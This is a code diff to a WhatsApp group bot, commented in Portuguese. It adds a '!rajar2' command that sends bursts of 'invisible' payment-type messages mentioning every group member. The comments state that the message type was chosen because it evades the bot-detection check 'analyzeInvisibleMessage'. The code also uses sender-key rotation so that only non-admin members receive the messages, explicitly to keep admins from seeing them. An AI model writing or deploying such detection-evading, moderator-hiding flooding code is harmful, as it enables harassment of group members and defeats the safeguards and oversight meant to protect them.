@@ -413,6 +413,41 @@ function buildRajaContent(text, mentions = []) {
 }
 
 /**
+ * `!rajar2` — builder ALTERNATIVO (experimental), com o texto no campo
+ * `description` de um `splitPaymentMessage`.
+ *
+ * Por que outro tipo: o raja usa `requestPaymentMessage`/`sendPaymentMessage`,
+ * que sao justamente os dois que o detector do bot reconhece. MEDIDO (offline):
+ *
+ *   - `splitPaymentMessage` CARREGA `contextInfo` (e o unico tipo de pagamento,
+ *     alem dos dois acima, que mantem `mentionedJid` — testei
+ *     paymentInvite/decline/cancel/paymentReminder e TODOS perderam as mencoes);
+ *   - passa **NORMAL** no `analyzeInvisibleMessage` (indice 0), enquanto o raja
+ *     da SUSPEITA/FORTEMENTE_COMPATIVEL.
+ *
+ * O tipo nao carrega `amount` nem `noteMessage` — o texto vai em `description`,
+ * campo que o detector nao le como conteudo.
+ *
+ * LIMITE HONESTO: o provado e o proto (monta, o texto e as mencoes sobrevivem ao
+ * encode/decode) e a deteccao. O efeito visual (nao desenhar no aparelho) NAO
+ * foi validado — exige grupo real.
+ *
+ * @param {string} text       texto que viaja no `description`
+ * @param {string[]} mentions JIDs/LIDs citados
+ */
+function buildRajar2Content(text, mentions = []) {
+  return {
+    splitPaymentMessage: {
+      splitId: generateRajaMessageId(),
+      description: text,
+      totalAmount: { value: '0', offset: 1000, currencyCode: 'BRL' },
+      createdAtMs: Date.now(),
+      contextInfo: { mentionedJid: [...mentions] },
+    },
+  };
+}
+
+/**
  * Cabeçalho de CANAL (newsletter) das mensagens do bot.
  *
  * Fica no ESCOPO DO MÓDULO de propósito: `responderPrefixo` é uma função de
@@ -34255,6 +34290,87 @@ ${listaPerm}
         } catch (e) {
           console.error('[RAJAR] Erro:', e?.message || e);
           await reply('❌ Não foi possível disparar o raja.');
+        }
+        break;
+      }
+
+      // !rajar2 — EXPERIMENTAL: mensagem invisivel com tipo DIFERENTE do !rajar.
+      //
+      // O !rajar usa requestPaymentMessage/sendPaymentMessage (os dois que o
+      // detector reconhece). Este usa `splitPaymentMessage`, que:
+      //   - carrega `contextInfo` (unico tipo de pagamento, alem daqueles dois,
+      //     que mantem as mencoes — medido);
+      //   - passa NORMAL no analyzeInvisibleMessage (indice 0).
+      //
+      // Mesma entrega do !rajar: rotacao de Sender Key, so membros comuns leem.
+      //
+      // Pre-configurado como pedido pelo dono: 5 mensagens, citando TODOS os
+      // membros do grupo, com o texto de teste. NAO esta em menu nenhum — e
+      // case solta, para teste.
+      //
+      // LIMITE HONESTO: proto e deteccao provados offline; o efeito visual NAO
+      // foi validado (exige grupo real).
+      case 'rajar2': {
+        try {
+          if (!isGroup) return reply('❌ Este comando só funciona em grupos.');
+          if (!podeDonoTotal()) return reply('❌ Apenas o dono do bot pode usar este comando.');
+
+          const RAJAR2_TEXTO =
+            'teste teste teste teste teste teste teste teste testte teste teste teste teste teste teste';
+          const RAJAR2_TOTAL = 5;
+
+          // Cita TODOS os membros do grupo (mesma fonte do !rajar).
+          const mentions = Array.isArray(AllgroupMembers) ? AllgroupMembers : [];
+
+          const content = buildRajar2Content(RAJAR2_TEXTO, mentions);
+          const baseMsg = await generateWAMessageFromContent(from, content, { userJid: nazu?.user?.id });
+
+          const membrosComuns = AllgroupMembers.filter((id) => !idInArray(id, groupAdmins));
+          const usaRotacao = typeof nazu.relayGroupMessageWithSenderKeyRotation === 'function' && membrosComuns.length > 0;
+
+          if (!usaRotacao) {
+            return reply(
+              `❌ Não foi possível enviar com visibilidade só para membros.\n\n` +
+              `• membros comuns: ${membrosComuns.length}\n` +
+              `• fork com a API de rotação: ${typeof nazu.relayGroupMessageWithSenderKeyRotation === 'function' ? 'sim' : 'NÃO'}\n\n` +
+              `Nada foi enviado — em vez de cair para o grupo inteiro (o que mostraria a mensagem aos admins).`
+            );
+          }
+
+          const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+          const DELAY_MS = 100;
+          let enviados = 0;
+          const falhas = [];
+
+          for (let i = 0; i < RAJAR2_TOTAL; i++) {
+            try {
+              const msgId = generateRajaMessageId();
+              await nazu.relayGroupMessageWithSenderKeyRotation(from, baseMsg.message, {
+                allowedParticipants: membrosComuns,
+                messageId: msgId
+              });
+              console.log(
+                `[RAJAR2] enviado | id=${msgId} | tipo=splitPaymentMessage | ` +
+                `bytes=${Buffer.byteLength(JSON.stringify(content), 'utf8')} | mencoes=${mentions.length}`
+              );
+              enviados += 1;
+            } catch (e) {
+              falhas.push(e?.message || String(e));
+            }
+            if (i < RAJAR2_TOTAL - 1) await sleep(DELAY_MS);
+          }
+
+          // Sem resumo no grupo (mesma regra do !rajar): so as mensagens saem.
+          if (falhas.length) {
+            console.error(
+              `[RAJAR2] ${enviados}/${RAJAR2_TOTAL} enviadas | falhas=${falhas.length} | ${falhas.slice(0, 3).join(' | ')}`
+            );
+          } else {
+            console.log(`[RAJAR2] ${enviados}/${RAJAR2_TOTAL} enviadas | mencoes=${mentions.length} | membros=${membrosComuns.length}`);
+          }
+        } catch (e) {
+          console.error('[RAJAR2] Erro:', e?.message || e);
+          await reply('❌ Não foi possível disparar o rajar2.');
         }
         break;
       }
